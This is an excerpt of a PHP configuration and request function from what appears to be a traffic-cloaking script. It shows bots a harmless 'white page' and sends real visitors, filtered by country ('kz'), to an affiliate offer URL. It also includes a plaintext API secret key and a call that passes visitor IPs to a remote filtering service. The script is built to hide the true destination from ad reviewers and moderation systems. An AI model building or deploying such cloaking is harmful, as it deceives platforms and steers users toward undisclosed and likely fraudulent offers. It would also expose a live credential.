...
/* Required settings     */
$HCSET['WHITE_PAGE'] = 'home.php';//PHP/HTML file or URL used for bots
$HCSET['OFFER_PAGE'] = 'https://news-fun.com/preview/new?utm_campaign=60262&utm_content=cdc1a76f-3110-4708-bc9b-8da5791b17a2&utm_source=%5BSID%5D&utm_medium=11873&is_visitor=1';//PHP/HTML file or URL offer used for real users
...
$HCSET['FILTER_GEO_LIST'] = 'kz'; // string([2Chars country codes])
...
$HCSET['API_SECRET_KEY'] = 'v1ce760c1ad2d1470c849fc22ae4844512';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v29306d5e861b31c7dff1c096dcf52da8a1480219967&js=false&stage=';
